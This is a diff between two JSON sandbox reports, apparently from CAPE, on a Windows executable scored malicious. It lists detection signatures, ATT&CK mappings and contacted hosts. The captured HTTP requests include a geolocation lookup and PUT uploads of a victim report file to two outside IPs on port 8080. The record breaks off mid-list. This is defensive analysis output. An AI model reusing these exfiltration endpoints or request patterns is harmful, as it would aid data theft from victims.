@@ -1,11 +1,11 @@
 {
   "schema_version": "1.0",
   "source": "cape",
-  "source_report_path": "docker/cape/work/storage/analyses/1/reports/report.json",
-  "cape_task_id": 1,
-  "parsed_at": "2026-08-12T16:18:02.224833+00:00",
+  "source_report_path": "docker/cape/work/storage/analyses/50/reports/report.json",
+  "cape_task_id": 50,
+  "parsed_at": "2026-08-28T20:11:00.314700+00:00",
   "target": {
-    "filename": "binary",
+    "filename": "03423b8784cac66602f6.exe",
     "md5": "ea08b197bbe8bc874a5c65500db03bf2",
     "sha1": "3cbe0f9a6bb6c1600e196d3c2b54132c72ccce0d",
     "sha256": "03423b8784cac66602f6dc04f6303668951e9c7280a80535a708d59e6cf82312",
@@ -15,9 +15,9 @@
   "analysis": {
     "malscore": 9.0,
     "malstatus": "Malicious",
-    "duration_seconds": 0,
-    "started": "2026-08-11 11:15:39",
-    "ended": "2026-08-11 11:15:39",
+    "duration_seconds": 238,
+    "started": "2026-08-28 20:06:44",
+    "ended": "2026-08-28 20:10:42",
     "cape_version": "2.5",
     "family_detections": []
   },
@@ -66,7 +66,7 @@
         "location_discovery"
       ],
       "ttps": [],
-      "match_count": 11
+      "match_count": 8
     },
     {
       "name": "queries_locale_api",
@@ -78,7 +78,7 @@
         "geofence"
       ],
       "ttps": [],
-      "match_count": 10
+      "match_count": 8
     },
     {
       "name": "antidebug_setunhandledexceptionfilter",
@@ -113,7 +113,7 @@
       "ttps": [
         "T1059"
       ],
-      "match_count": 2
+      "match_count": 1
     },
     {
       "name": "stealth_timeout",
@@ -147,7 +147,7 @@
         "anti-sandbox"
       ],
       "ttps": [],
-      "match_count": 65
+      "match_count": 50
     },
     {
       "name": "privilege_elevation_check",
@@ -162,7 +162,7 @@
         "T1033",
         "T1082"
       ],
-      "match_count": 6
+      "match_count": 2
     },
     {
       "name": "query_fips_reconnaissance",
@@ -176,33 +176,7 @@
       "ttps": [
         "T1082"
       ],
-      "match_count": 21
-    },
-    {
-      "name": "dead_connect",
-      "description": "Attempts to connect to a dead IP:Port (31 unique times)",
-      "severity": 2,
-      "confidence": 100,
-      "categories": [
-        "network"
-      ],
-      "ttps": [],
-      "match_count": 62
-    },
-    {
-      "name": "mountpoints_volume_discovery",
-      "description": "Queries the mount points and then resolves volume paths to enumerate storage devices",
-      "severity": 2,
-      "confidence": 20,
-      "categories": [
-        "discovery",
-        "ransomware",
-        "wiper"
-      ],
-      "ttps": [
-        "T1082"
-      ],
-      "match_count": 11
+      "match_count": 16
     },
     {
       "name": "registers_vectored_exception_handler",
@@ -234,20 +208,6 @@
       "match_count": 2
     },
     {
-      "name": "creates_suspended_process",
-      "description": "Creates a process in a suspended state, likely for injection",
-      "severity": 2,
-      "confidence": 50,
-      "categories": [
-        "injection",
-        "process hollowing"
-      ],
-      "ttps": [
-        "T1055"
-      ],
-      "match_count": 1
-    },
-    {
       "name": "reads_memory_remote_process",
       "description": "Reads from the memory of another process",
       "severity": 2,
@@ -257,7 +217,7 @@
         "injection"
       ],
       "ttps": [],
-      "match_count": 971
+      "match_count": 370
     },
     {
       "name": "stealth_window",
@@ -271,7 +231,34 @@
         "T1564.003",
         "T1564"
       ],
-      "match_count": 2
+      "match_count": 4
+    },
+    {
+      "name": "network_cnc_http",
+      "description": "HTTP traffic contains suspicious features which may be indicative of malware related traffic",
+      "severity": 2,
+      "confidence": 30,
+      "categories": [
+        "network",
+        "c2"
+      ],
+      "ttps": [
+        "T1071"
+      ],
+      "match_count": 5
+    },
+    {
+      "name": "network_http",
+      "description": "Performs some HTTP requests",
+      "severity": 2,
+      "confidence": 30,
+      "categories": [
+        "network"
+      ],
+      "ttps": [
+        "T1071"
+      ],
+      "match_count": 3
     },
     {
       "name": "recon_checkip",
@@ -286,21 +273,6 @@
         "T1071"
       ],
       "match_count": 1
-    },
-    {
-      "name": "discover_registry_mount_points",
-      "description": "Queries registry mount points to identify historical or connected removable/network drives",
-      "severity": 2,
-      "confidence": 20,
-      "categories": [
-        "discovery",
-        "ransomware",
-        "wiper"
-      ],
-      "ttps": [
-        "T1082"
-      ],
-      "match_count": 12
     },
     {
       "name": "injection_rwx",
@@ -325,38 +297,7 @@
       "ttps": [
         "T1202"
       ],
-      "match_count": 7
-    },
-    {
-      "name": "hardware_id_profiling",
-      "description": "Queries the Volume Serial Number or Physical Hardware ID, possibly for anti-sandbox, victim profiling or environmental keying",
-      "severity": 3,
-      "confidence": 80,
-      "categories": [
-        "evasion",
-        "recon",
-        "anti-sandbox"
-      ],
-      "ttps": [
-        "T1082"
-      ],
-      "match_count": 3
-    },
-    {
-      "name": "antisandbox_windows_activation",
-      "description": "Queries Windows licensing, activation, or genuine status, possibly to detect unactivated sandbox or analysis environments.",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "anti_sandbox",
-        "evasion",
-        "discovery"
-      ],
-      "ttps": [
-        "T1082",
-        "T1497"
-      ],
-      "match_count": 17
+      "match_count": 6
     },
     {
       "name": "antivm_wmi",
@@ -374,34 +315,19 @@
       "match_count": 10
     },
     {
-      "name": "mountpoint_manager_access",
-      "description": "Repeatedly opens the MountPointManager device to enumerate drive letters and resolve volume paths to discover all attached drives and network shares",
+      "name": "amsi_enumeration",
+      "description": "Enumerated Anti-Malware Scan Interface (AMSI) providers, a potential precursor to AMSI bypass or EDR unhooking",
       "severity": 3,
-      "confidence": 60,
+      "confidence": 40,
       "categories": [
-        "ransomware",
-        "wiper",
-        "discovery"
+        "discovery",
+        "defense_evasion"
       ],
       "ttps": [
-        "T1082"
-      ],
-      "match_count": 2
-    },
-    {
-      "name": "unbacked_process_mitigation_alteration",
-      "description": "Manipulated process mitigation policies (CFG/DEP) from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "defense_evasion",
-        "stealth",
-        "fileless"
-      ],
-      "ttps": [
+        "T1518",
         "T1562"
       ],
-      "match_count": 7
+      "match_count": 3
     },
     {
       "name": "unbacked_api_resolution",
@@ -417,7 +343,7 @@
         "T1129",
         "T1055"
       ],
-      "match_count": 323
+      "match_count": 12
     },
     {
       "name": "unbacked_library_load",
@@ -433,7 +359,7 @@
         "T1129",
         "T1059"
       ],
-      "match_count": 119
+      "match_count": 10
     },
     {
       "name": "unbacked_memory_protection_alteration",
@@ -449,184 +375,22 @@
       "ttps": [
         "T1055"
       ],
-      "match_count": 90
+      "match_count": 5
     },
     {
-      "name": "unbacked_mutex_creation",
-      "description": "Created or queried a mutex from dynamically allocated (unbacked) memory, indicative of a fileless payload checking or creating an infection marker",
+      "name": "recon_programs",
+      "description": "Collects information about installed applications",
       "severity": 3,
-      "confidence": 100,
+      "confidence": 20,
       "categories": [
-        "execution",
-        "evasion",
-        "fileless"
+        "discovery"
       ],
       "ttps": [
-        "T1055"
+        "T1012",
+        "T1082",
+        "T1518"
       ],
-      "match_count": 2
-    },
-    {
-      "name": "unbacked_process_creation",
-      "description": "Attempted to spawn a new child process from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "execution",
-        "evasion",
-        "fileless"
-      ],
-      "ttps": [
-        "T1055",
-        "T1106"
-      ],
-      "match_count": 4
-    },
-    {
-      "name": "unbacked_com_instantiation",
-      "description": "Attempted to use a COM object (CoCreateInstance) from dynamically allocated (unbacked) memory, possibly for WMI reconnaissance or DCOM lateral movement",
-      "severity": 3,
-      "confidence": 80,
-      "categories": [
-        "execution",
-        "discovery",
-        "lateral_movement",
-        "fileless"
-      ],
-      "ttps": [
-        "T1047"
-      ],
-      "match_count": 15
-    },
-    {
-      "name": "unbacked_crypto_operations",
-      "description": "Invoked native Windows cryptographic APIs from dynamically allocated (unbacked) memory, possible encryption/decryption of payloads, c2, files or data",
-      "severity": 3,
-      "confidence": 40,
-      "categories": [
-        "evasion",
-        "c2",
-        "fileless",
-        "obfuscation",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1027",
-        "T1573"
-      ],
-      "match_count": 3
-    },
-    {
-      "name": "unbacked_file_dropping",
-      "description": "Writes data to the filesystem from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "execution",
-        "exfiltration",
-        "fileless",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1105",
-        "T1074"
-      ],
-      "match_count": 2
-    },
-    {
-      "name": "unbacked_process_enumeration",
-      "description": "Attempted to enumerate running processes from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "discovery",
-        "fileless",
-        "reconnaissance",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1057"
-      ],
-      "match_count": 4
-    },
-    {
-      "name": "unbacked_registry_modification",
-      "description": "Attempted to modify the Windows registry from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "persistence",
-        "evasion",
-        "fileless"
-      ],
-      "ttps": [
-        "T1112",
-        "T1547"
-      ],
-      "match_count": 15
-    },
-    {
-      "name": "unbacked_service_manipulation",
-      "description": "Attempted to interact with the Service Control Manager from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "lateral_movement",
-        "persistence",
-        "fileless",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1543"
-      ],
-      "match_count": 3
-    },
-    {
-      "name": "unbacked_token_manipulation",
-      "description": "Attempted to open, duplicate, or impersonate an access token from dynamically allocated (unbacked) memory, indicative of credential theft or lateral movement",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "privilege_escalation",
-        "credential_access",
-        "lateral_movement"
-      ],
-      "ttps": [],
-      "match_count": 17
-    },
-    {
-      "name": "unbacked_dns_resolution",
-      "description": "Attempted to resolve a domain name from dynamically allocated (unbacked) memory",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "network",
-        "c2",
-        "fileless",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1071",
-        "T1568"
-      ],
-      "match_count": 2
-    },
-    {
-      "name": "unbacked_memory_network_connection",
-      "description": "Network connection initiated from dynamically allocated (unbacked) memory, indicative of fileless C2 activity",
-      "severity": 3,
-      "confidence": 100,
-      "categories": [
-        "network",
-        "c2",
-        "fileless",
-        "shellcode"
-      ],
-      "ttps": [
-        "T1071",
-        "T1055"
-      ],
-      "match_count": 33
+      "match_count": 18
     },
     {
       "name": "pe_compile_timestomping",
@@ -641,22 +405,6 @@
         "T1070"
       ],
       "match_count": 1
-    },
-    {
-      "name": "folder_enumeration",
-      "description": "Systematically searches multiple user directories using wildcards, common in ransomware/wipers/infostealers",
-      "severity": 3,
-      "confidence": 70,
-      "categories": [
-        "ransomware",
-        "wiper",
-        "infostealer",
-        "discovery"
-      ],
-      "ttps": [
-        "T1083"
-      ],
-      "match_count": 11
     },
     {
       "name": "infostealer_bitcoin",
@@ -703,47 +451,9 @@
         "T1552"
       ],
       "match_count": 8
-    },
-    {
-      "name": "suspicious_command_tools",
-      "description": "Uses suspicious command line tools or Windows utilities",
-      "severity": 3,
-      "confidence": 80,
-      "categories": [
-        "command",
-        "lateral"
-      ],
-      "ttps": [
-        "T1202"
-      ],
-      "match_count": 1
     }
   ],
   "attck_mappings": [
-    {
-      "technique": "T1082",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "hardware_id_profiling",
-      "confidence": "high",
-      "justification": "CAPE signature 'hardware_id_profiling' fired (severity=3, confidence=80%, categories=['evasion', 'recon', 'anti-sandbox'])"
-    },
-    {
-      "technique": "T1082",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "antisandbox_windows_activation",
-      "confidence": "high",
-      "justification": "CAPE signature 'antisandbox_windows_activation' fired (severity=3, confidence=100%, categories=['anti_sandbox', 'evasion', 'discovery'])"
-    },
-    {
-      "technique": "T1497",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "antisandbox_windows_activation",
-      "confidence": "high",
-      "justification": "CAPE signature 'antisandbox_windows_activation' fired (severity=3, confidence=100%, categories=['anti_sandbox', 'evasion', 'discovery'])"
-    },
     {
       "technique": "T1082",
       "name": "",
@@ -777,28 +487,28 @@
       "justification": "CAPE signature 'antivm_wmi' fired (severity=3, confidence=80%, categories=['anti-vm'])"
     },
     {
+      "technique": "T1518",
+      "name": "",
+      "source": "dynamic_signature",
+      "evidence": "amsi_enumeration",
+      "confidence": "low",
+      "justification": "CAPE signature 'amsi_enumeration' fired (severity=3, confidence=40%, categories=['discovery', 'defense_evasion'])"
+    },
+    {
+      "technique": "T1685",
+      "name": "",
+      "source": "dynamic_signature",
+      "evidence": "amsi_enumeration",
+      "confidence": "low",
+      "justification": "CAPE signature 'amsi_enumeration' fired (severity=3, confidence=40%, categories=['discovery', 'defense_evasion'])"
+    },
+    {
       "technique": "T1033",
       "name": "",
       "source": "dynamic_signature",
       "evidence": "privilege_elevation_check",
       "confidence": "medium",
       "justification": "CAPE signature 'privilege_elevation_check' fired (severity=2, confidence=80%, categories=['discovery', 'privilege_escalation'])"
-    },
-    {
-      "technique": "T1082",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "mountpoint_manager_access",
-      "confidence": "medium",
-      "justification": "CAPE signature 'mountpoint_manager_access' fired (severity=3, confidence=60%, categories=['ransomware', 'wiper', 'discovery'])"
-    },
-    {
-      "technique": "T1082",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "mountpoints_volume_discovery",
-      "confidence": "low",
-      "justification": "CAPE signature 'mountpoints_volume_discovery' fired (severity=2, confidence=20%, categories=['discovery', 'ransomware', 'wiper'])"
     },
     {
       "technique": "T1055",
@@ -815,14 +525,6 @@
       "evidence": "http_request",
       "confidence": "medium",
       "justification": "CAPE signature 'http_request' fired (severity=2, confidence=100%, categories=['network'])"
-    },
-    {
-      "technique": "T1055",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "creates_suspended_process",
-      "confidence": "medium",
-      "justification": "CAPE signature 'creates_suspended_process' fired (severity=2, confidence=50%, categories=['injection', 'process hollowing'])"
     },
     {
       "technique": "T1620",
@@ -865,100 +567,44 @@
       "justification": "CAPE signature 'unbacked_memory_protection_alteration' fired (severity=3, confidence=20%, categories=['evasion', 'stealth', 'fileless', 'shellcode'])"
     },
     {
-      "technique": "T1055",
+      "technique": "T1012",
       "name": "",
       "source": "dynamic_signature",
-      "evidence": "unbacked_mutex_creation",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_mutex_creation' fired (severity=3, confidence=100%, categories=['execution', 'evasion', 'fileless'])"
-    },
-    {
-      "technique": "T1055",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_process_creation",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_process_creation' fired (severity=3, confidence=100%, categories=['execution', 'evasion', 'fileless'])"
-    },
-    {
-      "technique": "T1047",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_com_instantiation",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_com_instantiation' fired (severity=3, confidence=80%, categories=['execution', 'discovery', 'lateral_movement', 'fileless'])"
-    },
-    {
-      "technique": "T1027",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_crypto_operations",
+      "evidence": "recon_programs",
       "confidence": "low",
-      "justification": "CAPE signature 'unbacked_crypto_operations' fired (severity=3, confidence=40%, categories=['evasion', 'c2', 'fileless', 'obfuscation', 'shellcode'])"
+      "justification": "CAPE signature 'recon_programs' fired (severity=3, confidence=20%, categories=['discovery'])"
     },
     {
-      "technique": "T1105",
+      "technique": "T1082",
       "name": "",
       "source": "dynamic_signature",
-      "evidence": "unbacked_file_dropping",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_file_dropping' fired (severity=3, confidence=100%, categories=['execution', 'exfiltration', 'fileless', 'shellcode'])"
+      "evidence": "recon_programs",
+      "confidence": "low",
+      "justification": "CAPE signature 'recon_programs' fired (severity=3, confidence=20%, categories=['discovery'])"
     },
     {
-      "technique": "T1057",
+      "technique": "T1518",
       "name": "",
       "source": "dynamic_signature",
-      "evidence": "unbacked_process_enumeration",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_process_enumeration' fired (severity=3, confidence=100%, categories=['discovery', 'fileless', 'reconnaissance', 'shellcode'])"
-    },
-    {
-      "technique": "T1112",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_registry_modification",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_registry_modification' fired (severity=3, confidence=100%, categories=['persistence', 'evasion', 'fileless'])"
-    },
-    {
-      "technique": "T1547",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_registry_modification",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_registry_modification' fired (severity=3, confidence=100%, categories=['persistence', 'evasion', 'fileless'])"
-    },
-    {
-      "technique": "T1543",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_service_manipulation",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_service_manipulation' fired (severity=3, confidence=100%, categories=['lateral_movement', 'persistence', 'fileless', 'shellcode'])"
+      "evidence": "recon_programs",
+      "confidence": "low",
+      "justification": "CAPE signature 'recon_programs' fired (severity=3, confidence=20%, categories=['discovery'])"
     },
     {
       "technique": "T1071",
       "name": "",
       "source": "dynamic_signature",
-      "evidence": "unbacked_dns_resolution",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_dns_resolution' fired (severity=3, confidence=100%, categories=['network', 'c2', 'fileless', 'shellcode'])"
+      "evidence": "network_cnc_http",
+      "confidence": "low",
+      "justification": "CAPE signature 'network_cnc_http' fired (severity=2, confidence=30%, categories=['network', 'c2'])"
     },
     {
       "technique": "T1071",
       "name": "",
       "source": "dynamic_signature",
-      "evidence": "unbacked_memory_network_connection",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_memory_network_connection' fired (severity=3, confidence=100%, categories=['network', 'c2', 'fileless', 'shellcode'])"
-    },
-    {
-      "technique": "T1055",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "unbacked_memory_network_connection",
-      "confidence": "high",
-      "justification": "CAPE signature 'unbacked_memory_network_connection' fired (severity=3, confidence=100%, categories=['network', 'c2', 'fileless', 'shellcode'])"
+      "evidence": "network_http",
+      "confidence": "low",
+      "justification": "CAPE signature 'network_http' fired (severity=2, confidence=30%, categories=['network'])"
     },
     {
       "technique": "T1071",
@@ -991,22 +637,6 @@
       "evidence": "cmdline_terminate",
       "confidence": "low",
       "justification": "CAPE signature 'cmdline_terminate' fired (severity=1, confidence=100%, categories=['command'])"
-    },
-    {
-      "technique": "T1083",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "folder_enumeration",
-      "confidence": "medium",
-      "justification": "CAPE signature 'folder_enumeration' fired (severity=3, confidence=70%, categories=['ransomware', 'wiper', 'infostealer', 'discovery'])"
-    },
-    {
-      "technique": "T1082",
-      "name": "",
-      "source": "dynamic_signature",
-      "evidence": "discover_registry_mount_points",
-      "confidence": "low",
-      "justification": "CAPE signature 'discover_registry_mount_points' fired (severity=2, confidence=20%, categories=['discovery', 'ransomware', 'wiper'])"
     },
     {
       "technique": "T1005",
@@ -1092,345 +722,11 @@
   "network": {
     "domains": [
       {
-        "domain": "90f364fdc014e0961d460c2d63103332.afd.footprintdns.com",
-        "ip": "104.212.67.104"
-      },
-      {
         "domain": "ip-api.com",
         "ip": "208.95.112.1"
       }
     ],
     "hosts": [
-      {
-        "ip": "47.96.78.224",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "38.60.191.38",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "101.126.19.171",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "101.132.223.26",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "101.43.160.136",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "129.151.109.160",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "47.110.140.182",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "104.18.33.89",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "168.138.211.88",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8099
-        ]
-      },
-      {
-        "ip": "172.64.154.167",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "18.228.80.130",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "41.87.207.180",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          9090
-        ]
-      },
-      {
-        "ip": "8.134.71.132",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8082
-        ]
-      },
-      {
-        "ip": "138.2.92.67",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "8.219.110.16",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          9999
-        ]
-      },
-      {
-        "ip": "66.42.56.128",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "154.9.207.142",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "44.228.161.50",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "192.99.196.191",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "107.161.20.142",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "159.203.174.113",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8090
-        ]
-      },
-      {
-        "ip": "116.202.101.219",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "185.217.98.121",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "95.216.147.179",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "5.196.181.135",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "45.82.65.63",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "96.16.86.160",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "194.164.198.113",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          8080
-        ]
-      },
-      {
-        "ip": "206.189.109.146",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "46.4.73.118",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          9000
-        ]
-      },
       {
         "ip": "167.99.138.249",
         "country_name": "unknown",
@@ -1452,173 +748,72 @@
         "ports": [
           8080
         ]
-      },
-      {
-        "ip": "40.126.53.16",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "208.95.112.1",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "ip-api.com",
-        "inaddrarpa": "",
-        "ports": [
-          80
-        ]
-      },
-      {
-        "ip": "96.16.86.208",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "104.212.67.66",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "90f364fdc014e0961d460c2d63103332.afd.footprintdns.com",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "96.16.86.215",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "96.16.86.212",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "96.16.86.214",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "96.16.86.210",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "96.16.86.219",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
-      },
-      {
-        "ip": "4.242.235.91",
-        "country_name": "unknown",
-        "asn": "",
-        "asn_name": "",
-        "hostname": "",
-        "inaddrarpa": "",
-        "ports": [
-          443
-        ]
       }
     ],
     "dns_requests": [
-      {
-        "request": "90f364fdc014e0961d460c2d63103332.afd.footprintdns.com",
-        "type": "A",
-        "answers": [
-          {
-            "type": "CNAME",
-            "data": "bna30r9a.msedge.net"
-          },
-          {
-            "type": "A",
-            "data": "104.212.67.66"
-          },
-          {
-            "type": "CNAME",
-            "data": "global-mr-moi.trafficmanager.net"
-          }
-        ],
-        "first_seen": 1786444409.060878
-      },
       {
         "request": "ip-api.com",
         "type": "A",
         "answers": [
           {
             "type": "A",
-            "data": "208.95.112.1"
+            "data": "192.168.122.1"
           }
         ],
-        "first_seen": 1786444419.613316
+        "first_seen": 1787947642.668183
       }
     ],
-    "http_requests": [],
-    "tcp_count": 0,
-    "udp_count": 28
+    "http_requests": [
+      {
+        "count": 1,
+        "host": "ip-api.com",
+        "port": 80,
+        "data": "GET /line?fields=query,country HTTP/1.1\r\nHost: ip-api.com\r\nConnection: Keep-Alive\r\n\r\n",
+        "uri": "http://ip-api.com/line?fields=query,country",
+        "body": "",
+        "path": "/line?fields=query,country",
+        "user-agent": "",
+        "version": "1.1",
+        "method": "GET",
+        "first_seen": 1787947643.411338
+      },
+      {
+        "count": 1,
+        "host": "206.166.251.4:8080",
+        "port": 8080,
+        "data": "PUT /Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr HTTP/1.1\r\nHost: 206.166.251.4:8080\r\nContent-Length: 51294\r\nExpect: 100-continue\r\nConnection: Keep-Alive\r\n\r\n",
+        "uri": "http://206.166.251.4:8080/Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr",
+        "body": "",
+        "path": "/Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr",
+        "user-agent": "",
+        "version": "1.1",
+        "method": "PUT",
+        "first_seen": 1787947723.528569
+      },
+      {
+        "count": 1,
+        "host": "167.99.138.249:8080",
+        "port": 8080,
+        "data": "PUT /Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr HTTP/1.1\r\nHost: 167.99.138.249:8080\r\nContent-Length: 51294\r\nExpect: 100-continue\r\nConnection: Keep-Alive\r\n\r\n",
+        "uri": "http://167.99.138.249:8080/Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr",
+        "body": "",
+        "path": "/Zteoi_sandbox%40DESKTOP-EBJM4FV_report.wsr",
